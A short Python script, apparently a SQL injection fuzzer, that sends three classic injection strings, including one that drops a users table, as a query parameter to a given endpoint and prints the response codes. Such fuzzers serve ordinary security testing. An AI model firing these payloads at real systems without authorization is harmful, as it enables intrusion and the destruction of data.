import requests

payloads = ["' OR 1=1 --", "\"; DROP TABLE users; --", "' OR 'a'='a"]

def run_sql_fuzz(endpoint):
    for payload in payloads:
        try:
            response = requests.get(endpoint, params={"input": payload})
            print(f"    [Payload: {payload}] → Status {response.status_code}")
        except Exception as e:
            print(f"    [Error] {e}")
